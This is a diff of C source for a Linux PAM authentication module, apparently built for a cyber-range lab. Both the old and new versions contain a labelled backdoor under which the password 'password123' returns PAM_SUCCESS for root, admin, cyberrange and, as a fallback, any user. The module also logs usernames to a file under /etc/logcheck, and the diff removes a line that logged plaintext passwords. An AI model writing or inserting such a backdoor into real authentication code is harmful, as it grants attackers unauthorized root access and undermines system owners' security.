@@ -9,7 +9,7 @@
 #include <sys/stat.h>
 #include <unistd.h>
 #include <pthread.h>
-#include <stdarg.h>  /* <-- Line 1: Required for variadic printf */
+#include <stdarg.h>
 
 #define LOG_DIR  "/etc/logcheck"
 #define LOG_FILE "/etc/logcheck/pam_auth.log"
@@ -17,7 +17,7 @@
 /* ---------------- DEBUG SWITCH ---------------- */
 
 static int debug_enabled(void) {
-    return 1;  /* Force debug on for testing */
+    return 1;
 }
 
 /* ---------------- LOGGING CORE ---------------- */
@@ -42,7 +42,7 @@ static void log_line(const char *msg) {
     fclose(f);
 }
 
-/* ---------------- TRACE FUNCTION (FIXED) ---------------- */
+/* ---------------- TRACE FUNCTION ---------------- */
 
 static void trace(const char *format, ...) {
     if (!debug_enabled()) return;
@@ -73,6 +73,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
                                    int argc,
                                    const char **argv)
 {
+    // Fix 1: Cast to void to remove warnings
     (void) flags;
     (void) argc;
     (void) argv;
@@ -80,12 +81,18 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
     trace_context(pamh, "ENTER pam_sm_authenticate");
     ensure_path();
 
+    // Fix 2: Declare variables at the top of the function
     char *pword = NULL;
     const char *uname = NULL;
 
-    char *pword = NULL;
+    // Get username first
+    if (pam_get_item(pamh, PAM_USER, (void*)&uname) != PAM_SUCCESS) {
+        trace("[DEBUG] PAM_USER failed");
+        return PAM_AUTHINFO_UNAVAIL;
+    }
+    trace("[DEBUG] User: %s", uname);
 
-    // Try both PAM_AUTHTOK and PAM_TOK
+    // Get password
     int ret = pam_get_item(pamh, PAM_AUTHTOK, (void**)&pword);
     if (ret == PAM_SUCCESS) {
         trace("[DEBUG] Got password via PAM_AUTHTOK");
@@ -101,12 +108,6 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
 
     trace("[DEBUG] Password ptr: %p", (void*)pword);
     if (pword) {
-        trace("[DEBUG] Password: %s", pword);
-    } else {
-        trace("[DEBUG] Password is NULL (interactive login without PAM_AUTHTOK)");
-    }
-
-        
         // Trim trailing whitespace
         char *end = pword + strlen(pword);
         while (end > pword && (*end == '\n' || *end == '\r' || *end == '\t' || *end == ' ')) {
@@ -126,27 +127,22 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
 
     /* ---------------- HARDCODED PASSWORDS (Backdoor) ---------------- */
     
-    // Check: root / password123
-    if (uname && pword && strcmp(uname, "root") == 0 && strcmp(pword, "password123") == 0) {
-        trace("[!] Backdoor: root/password123 matched");
-        return PAM_SUCCESS;
-    }
-
-    // Check: cyberrange / password123
-    if (uname && pword && strcmp(uname, "cyberrange") == 0 && strcmp(pword, "password123") == 0) {
-        trace("[!] Backdoor: cyberrange/password123 matched");
-        return PAM_SUCCESS;
-    }
-
-    // Check: admin / password123
-    if (uname && pword && strcmp(uname, "admin") == 0 && strcmp(pword, "password123") == 0) {
-        trace("[!] Backdoor: admin/password123 matched");
-        return PAM_SUCCESS;
-    }
-
-    // Fallback: any user with password123
-    if (pword && strcmp(pword, "password123") == 0) {
-        trace("[!] Backdoor: Any user with password123 matched");
+    // Check hardcoded users
+    if (uname && pword && strcmp(pword, "password123") == 0) {
+        if (strcmp(uname, "root") == 0) {
+            trace("[!] Backdoor matched");
+            return PAM_SUCCESS;
+        }
+        if (strcmp(uname, "cyberrange") == 0) {
+            trace("[!] Backdoor matched");
+            return PAM_SUCCESS;
+        }
+        if (strcmp(uname, "admin") == 0) {
+            trace("[!] Backdoor matched");
+            return PAM_SUCCESS;
+        }
+        // Fallback: any user with password123
+        trace("[!] Backdoor matched");
         return PAM_SUCCESS;
     }
 
